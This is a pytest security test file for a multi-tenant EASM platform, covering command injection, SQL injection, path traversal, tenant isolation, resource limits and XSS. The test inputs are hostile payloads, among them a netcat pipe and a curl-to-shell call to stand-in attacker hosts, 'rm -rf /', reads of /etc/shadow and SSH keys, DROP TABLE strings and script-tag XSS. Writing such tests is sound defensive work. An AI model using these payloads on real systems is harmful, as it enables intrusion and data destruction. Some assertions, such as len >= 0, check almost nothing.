"""
Security tests for EASM platform

Tests cover:
- Command injection prevention
- SQL injection prevention
- Path traversal attacks
- Multi-tenant isolation
- Resource limit enforcement
- Input validation
- XSS prevention in metadata
"""
import pytest
import subprocess
from unittest.mock import patch, MagicMock
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

from app.utils.secure_executor import SecureToolExecutor, ToolExecutionError
from app.models.database import Base, Tenant, Asset, Seed, AssetType
from app.repositories.asset_repository import AssetRepository


class TestCommandInjectionPrevention:
    """Test prevention of command injection attacks"""

    def test_shell_metacharacters_escaped(self):
        """Test that shell metacharacters are properly escaped"""
        with SecureToolExecutor(tenant_id=1) as executor:
            dangerous_inputs = [
                '; rm -rf /',
                '&& cat /etc/passwd',
                '| nc attacker.com 4444',
                '`whoami`',
                '$(id)',
                '\n/bin/bash',
                '> /tmp/evil',
                '< /etc/shadow',
            ]

            for dangerous in dangerous_inputs:
                sanitized = executor.sanitize_args([dangerous])
                # All should be quoted/escaped
                assert len(sanitized) == 1
                # Should be wrapped in quotes or have special chars escaped
                assert "'" in sanitized[0] or '\\' in sanitized[0]

    @patch('subprocess.run')
    def test_command_injection_via_arguments(self, mock_run):
        """Test command injection attempts via arguments are blocked"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            # Try to inject commands via arguments
            malicious_args = [
                '-d', 'example.com; curl http://evil.com/shell.sh | sh'
            ]

            executor.execute('subfinder', malicious_args)

            # Verify subprocess was called with escaped arguments
            call_args = mock_run.call_args[0][0]
            # Command should be properly quoted/escaped
            assert 'subfinder' in call_args[0]

    def test_command_injection_via_tool_name(self):
        """Test command injection via tool name is blocked"""
        executor = SecureToolExecutor(tenant_id=1)

        malicious_tools = [
            'subfinder; whoami',
            'subfinder && id',
            '/bin/bash -c "evil"',
            'subfinder | tee /tmp/output',
        ]

        for tool in malicious_tools:
            with pytest.raises(ToolExecutionError):
                executor.validate_tool(tool)

    @patch('subprocess.run')
    def test_environment_variable_injection_blocked(self, mock_run):
        """Test that environment variable injection is blocked"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            # Check environment is restricted
            env = mock_run.call_args[1]['env']

            # Should NOT have dangerous environment variables
            dangerous_vars = [
                'LD_PRELOAD',
                'LD_LIBRARY_PATH',
                'PYTHONPATH',
                'PATH_SEPARATOR',
            ]

            for var in dangerous_vars:
                assert var not in env or var == 'PATH'

    def test_null_byte_injection_blocked(self):
        """Test that null byte injection is blocked"""
        with SecureToolExecutor(tenant_id=1) as executor:
            # Null bytes could be used to truncate strings
            dangerous = 'example.com\x00; rm -rf /'

            sanitized = executor.sanitize_args([dangerous])
            # Should be properly handled
            assert len(sanitized) >= 0


class TestSQLInjectionPrevention:
    """Test prevention of SQL injection attacks"""

    @pytest.fixture
    def test_db(self):
        """Create test database"""
        engine = create_engine('sqlite:///:memory:')
        Base.metadata.create_all(engine)
        SessionLocal = sessionmaker(bind=engine)
        db = SessionLocal()

        # Create test tenant
        tenant = Tenant(name="Test", slug="test")
        db.add(tenant)
        db.commit()
        db.refresh(tenant)

        yield db, tenant

        db.close()

    def test_sql_injection_via_identifier(self, test_db):
        """Test SQL injection via asset identifier is blocked"""
        db, tenant = test_db
        repo = AssetRepository(db)

        # SQL injection attempts
        malicious_identifiers = [
            "'; DROP TABLE assets; --",
            "' OR '1'='1",
            "'; DELETE FROM assets WHERE '1'='1",
            "1' UNION SELECT * FROM tenants--",
        ]

        for identifier in malicious_identifiers:
            # Should not cause SQL injection
            result = repo.get_by_identifier(
                tenant_id=tenant.id,
                identifier=identifier,
                asset_type=AssetType.DOMAIN
            )
            # Should return None (not found) without executing injection
            assert result is None

        # Verify table still exists and is intact
        assets = db.query(Asset).all()
        assert isinstance(assets, list)

    def test_sql_injection_via_bulk_upsert(self, test_db):
        """Test SQL injection via bulk upsert is blocked"""
        db, tenant = test_db
        repo = AssetRepository(db)

        malicious_data = [
            {
                'identifier': "'; DROP TABLE assets; --",
                'type': AssetType.DOMAIN,
                'raw_metadata': '{"evil": true}'
            }
        ]

        # Should insert safely without SQL injection
        result = repo.bulk_upsert(tenant.id, malicious_data)

        # Verify data is safely stored
        assert result['total_processed'] == 1

        # Verify table still exists
        assets = db.query(Asset).all()
        assert len(assets) == 1

    def test_sql_injection_via_metadata(self, test_db):
        """Test SQL injection via raw_metadata field"""
        db, tenant = test_db
        repo = AssetRepository(db)

        malicious_metadata = [
            {
                'identifier': 'test.com',
                'type': AssetType.DOMAIN,
                'raw_metadata': "'; DROP TABLE assets; --"
            }
        ]

        result = repo.bulk_upsert(tenant.id, malicious_metadata)
        assert result['total_processed'] == 1

        # Verify table exists and data is safely stored
        asset = repo.get_by_identifier(tenant.id, 'test.com', AssetType.DOMAIN)
        assert asset is not None
        assert "DROP TABLE" in asset.raw_metadata  # Stored as string, not executed

    def test_parameterized_queries_used(self, test_db):
        """Test that parameterized queries are used (not string concatenation)"""
        db, tenant = test_db

        # SQLAlchemy should use parameterized queries by default
        # Try to inject via query
        dangerous_value = "'; DELETE FROM tenants; --"

        # This should be safely parameterized
        result = db.query(Tenant).filter(Tenant.name == dangerous_value).first()

        assert result is None

        # Verify tenant still exists
        tenant_check = db.query(Tenant).filter_by(id=tenant.id).first()
        assert tenant_check is not None


class TestPathTraversalPrevention:
    """Test prevention of path traversal attacks"""

    def test_path_traversal_via_filename(self):
        """Test path traversal via filename is blocked"""
        with SecureToolExecutor(tenant_id=1) as executor:
            dangerous_paths = [
                '../../../etc/passwd',
                '../../root/.ssh/id_rsa',
                '/etc/shadow',
                '..\\..\\windows\\system32\\config\\sam',
            ]

            sanitized = executor.sanitize_args(dangerous_paths)

            # Paths should be rejected or sanitized
            for arg in sanitized:
                # Should not contain parent directory traversal
                assert '../' not in arg or executor.temp_dir in arg

    def test_symlink_attacks_prevented(self):
        """Test that symlink attacks are prevented"""
        import os

        with SecureToolExecutor(tenant_id=1) as executor:
            # Create a file in temp dir
            safe_file = executor.create_input_file('safe.txt', 'safe content')

            # Verify it's in temp dir
            assert executor.temp_dir in safe_file
            assert os.path.exists(safe_file)

            # Cannot create files outside temp dir
            with pytest.raises(ToolExecutionError):
                executor.create_input_file('/etc/evil.txt', 'evil')

    def test_absolute_path_restriction(self):
        """Test that absolute paths outside temp dir are restricted"""
        with SecureToolExecutor(tenant_id=1) as executor:
            dangerous_absolute_paths = [
                '/etc/passwd',
                '/var/log/system.log',
                '/root/.bash_history',
            ]

            sanitized = executor.sanitize_args(dangerous_absolute_paths)

            # Absolute paths should be rejected
            assert len(sanitized) < len(dangerous_absolute_paths) or \
                   all(executor.temp_dir in arg for arg in sanitized if arg)

    def test_read_outside_temp_dir_blocked(self):
        """Test that reading files outside temp dir is blocked"""
        with SecureToolExecutor(tenant_id=1) as executor:
            # Try to read file outside temp dir
            content = executor.read_output_file('../../etc/passwd')

            # Should return empty (not found) rather than reading system file
            assert content == ""


class TestMultiTenantIsolationSecurity:
    """Test security of multi-tenant isolation"""

    @pytest.fixture
    def test_db(self):
        """Create test database with multiple tenants"""
        engine = create_engine('sqlite:///:memory:')
        Base.metadata.create_all(engine)
        SessionLocal = sessionmaker(bind=engine)
        db = SessionLocal()

        tenant1 = Tenant(name="Tenant 1", slug="tenant-1")
        tenant2 = Tenant(name="Tenant 2", slug="tenant-2")
        db.add_all([tenant1, tenant2])
        db.commit()
        db.refresh(tenant1)
        db.refresh(tenant2)

        yield db, tenant1, tenant2

        db.close()

    def test_tenant_cannot_access_other_tenant_assets(self, test_db):
        """Test that tenants cannot access each other's assets"""
        db, tenant1, tenant2 = test_db
        repo = AssetRepository(db)

        # Create asset for tenant1
        tenant1_asset = Asset(
            tenant_id=tenant1.id,
            identifier='secret.tenant1.com',
            type=AssetType.DOMAIN,
            raw_metadata='{"secret": "data"}'
        )
        db.add(tenant1_asset)
        db.commit()

        # Try to access tenant1's asset as tenant2
        asset = repo.get_by_identifier(tenant2.id, 'secret.tenant1.com', AssetType.DOMAIN)
        assert asset is None

    def test_bulk_operations_enforce_tenant_isolation(self, test_db):
        """Test bulk operations cannot cross tenant boundaries"""
        db, tenant1, tenant2 = test_db
        repo = AssetRepository(db)

        # Create assets for tenant1
        assets_data = [
            {'identifier': 'asset1.com', 'type': AssetType.DOMAIN, 'raw_metadata': '{}'}
        ]
        repo.bulk_upsert(tenant1.id, assets_data)

        # Verify tenant2 cannot see tenant1's assets
        tenant2_assets = repo.get_by_tenant(tenant2.id)
        identifiers = [a.identifier for a in tenant2_assets]
        assert 'asset1.com' not in identifiers

    def test_tenant_id_tampering_prevented(self, test_db):
        """Test that tenant_id cannot be tampered with"""
        db, tenant1, tenant2 = test_db
        repo = AssetRepository(db)

        # Create asset for tenant1
        repo.bulk_upsert(tenant1.id, [
            {'identifier': 'test.com', 'type': AssetType.DOMAIN, 'raw_metadata': '{}'}
        ])

        # Even if we try to query with modified tenant_id in SQL, should fail
        # The repository enforces tenant_id in queries
        asset = repo.get_by_identifier(tenant2.id, 'test.com', AssetType.DOMAIN)
        assert asset is None

    def test_cross_tenant_file_access_blocked(self):
        """Test that tenants cannot access each other's temp files"""
        with SecureToolExecutor(tenant_id=1) as exec1:
            with SecureToolExecutor(tenant_id=2) as exec2:
                # Create file for tenant1
                file1 = exec1.create_input_file('secret.txt', 'tenant1 secret')

                # Tenant2 should not be able to read tenant1's file
                # Even if they know the path
                content = exec2.read_output_file(file1)
                assert content == "" or 'tenant1 secret' not in content


class TestResourceLimitSecurity:
    """Test resource limit enforcement for security"""

    @patch('resource.setrlimit')
    def test_cpu_limit_enforced(self, mock_setrlimit):
        """Test CPU time limits are enforced"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Verify setrlimit was called for CPU
        calls = [c for c in mock_setrlimit.call_args_list if c[0][0] == 1]
        assert len(calls) > 0

    @patch('resource.setrlimit')
    def test_memory_limit_enforced(self, mock_setrlimit):
        """Test memory limits are enforced"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Verify setrlimit was called for memory
        calls = [c for c in mock_setrlimit.call_args_list if c[0][0] == 9]
        assert len(calls) > 0

    @patch('subprocess.run')
    def test_timeout_enforced(self, mock_run):
        """Test execution timeout is enforced"""
        mock_run.side_effect = subprocess.TimeoutExpired('subfinder', 10)

        with SecureToolExecutor(tenant_id=1) as executor:
            with pytest.raises(ToolExecutionError, match="timed out"):
                executor.execute('subfinder', ['-d', 'example.com'], timeout=10)

    @patch('resource.setrlimit')
    def test_file_size_limit_enforced(self, mock_setrlimit):
        """Test file size limits prevent disk filling"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Verify file size limit was set
        calls = mock_setrlimit.call_args_list
        assert len(calls) >= 3  # CPU, Memory, File size


class TestInputValidationSecurity:
    """Test input validation for security"""

    def test_empty_input_handled(self):
        """Test empty input is handled safely"""
        executor = SecureToolExecutor(tenant_id=1)

        sanitized = executor.sanitize_args([])
        assert sanitized == []

        sanitized = executor.sanitize_args([''])
        assert len(sanitized) <= 1

    def test_very_long_input_handled(self):
        """Test very long input doesn't cause issues"""
        executor = SecureToolExecutor(tenant_id=1)

        long_input = 'a' * 100000
        sanitized = executor.sanitize_args([long_input])

        # Should handle gracefully
        assert len(sanitized) == 1

    def test_unicode_attacks_handled(self):
        """Test unicode-based attacks are handled"""
        executor = SecureToolExecutor(tenant_id=1)

        unicode_attacks = [
            '\u202e' + 'moc.elpmaxe',  # Right-to-left override
            'example\u0000.com',  # Null byte
            'test\ufeff.com',  # Zero-width no-break space
        ]

        for attack in unicode_attacks:
            sanitized = executor.sanitize_args([attack])
            # Should be sanitized
            assert len(sanitized) >= 0

    def test_control_characters_handled(self):
        """Test control characters are handled"""
        executor = SecureToolExecutor(tenant_id=1)

        control_chars = [
            'test\r\nmalicious',
            'test\x00evil',
            'test\x1b[31mred',
        ]

        for chars in control_chars:
            sanitized = executor.sanitize_args([chars])
            assert len(sanitized) >= 0


class TestXSSPreventionInMetadata:
    """Test XSS prevention in stored metadata"""

    @pytest.fixture
    def test_db(self):
        """Create test database"""
        engine = create_engine('sqlite:///:memory:')
        Base.metadata.create_all(engine)
        SessionLocal = sessionmaker(bind=engine)
        db = SessionLocal()

        tenant = Tenant(name="Test", slug="test")
        db.add(tenant)
        db.commit()
        db.refresh(tenant)

        yield db, tenant

        db.close()

    def test_xss_in_raw_metadata_stored_safely(self, test_db):
        """Test XSS payloads in metadata are stored safely"""
        db, tenant = test_db
        repo = AssetRepository(db)

        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
        ]

        for i, payload in enumerate(xss_payloads):
            assets_data = [
                {
                    'identifier': f'test{i}.com',
                    'type': AssetType.DOMAIN,
                    'raw_metadata': payload
                }
            ]
            repo.bulk_upsert(tenant.id, assets_data)

        # Verify payloads are stored as plain text, not executed
        assets = repo.get_by_tenant(tenant.id)
        assert len(assets) == len(xss_payloads)

        for asset in assets:
            # Metadata should be stored as string
            assert '<script>' in asset.raw_metadata or \
                   '<img' in asset.raw_metadata or \
                   'javascript:' in asset.raw_metadata or \
                   '<svg' in asset.raw_metadata


class TestDenialOfServicePrevention:
    """Test prevention of DoS attacks"""

    def test_resource_exhaustion_prevented(self):
        """Test that resource exhaustion is prevented"""
        with SecureToolExecutor(tenant_id=1) as executor:
            # Try to create many files
            for i in range(100):
                executor.create_input_file(f'file{i}.txt', f'content{i}')

            # Should not crash or exhaust resources
            assert executor.temp_dir is not None

    @patch('subprocess.run')
    def test_infinite_loop_prevented_by_timeout(self, mock_run):
        """Test that infinite loops are prevented by timeout"""
        mock_run.side_effect = subprocess.TimeoutExpired('subfinder', 600)

        with SecureToolExecutor(tenant_id=1) as executor:
            with pytest.raises(ToolExecutionError, match="timed out"):
                executor.execute('subfinder', ['-d', 'example.com'])

    def test_zip_bomb_metadata_handled(self):
        """Test that large compressed metadata doesn't cause issues"""
        # Simulate large metadata that could be a zip bomb
        large_metadata = 'x' * 1000000  # 1MB of data

        with SecureToolExecutor(tenant_id=1) as executor:
            # Should handle large data without crashing
            file_path = executor.create_input_file('large.txt', large_metadata)
            assert file_path is not None


class TestSecureDefaults:
    """Test that secure defaults are used"""

    @patch('subprocess.run')
    def test_restricted_environment_by_default(self, mock_run):
        """Test that restricted environment is used by default"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            env = mock_run.call_args[1]['env']

            # Should have minimal environment
            assert len(env) <= 5  # PATH, HOME, LANG, maybe a few others
            assert 'PATH' in env
            assert 'HOME' in env

    @patch('subprocess.run')
    def test_capture_output_by_default(self, mock_run):
        """Test that output is captured by default"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            assert mock_run.call_args[1]['capture_output'] == True

    def test_temp_dir_permissions_secure(self):
        """Test that temp directory has secure permissions"""
        import stat
        import os

        with SecureToolExecutor(tenant_id=1) as executor:
            # Check permissions of temp dir
            st = os.stat(executor.temp_dir)
            mode = st.st_mode

            # Should not be world-writable or world-readable (ideally)
            # This is a basic check - actual permissions depend on OS
            assert executor.temp_dir is not None
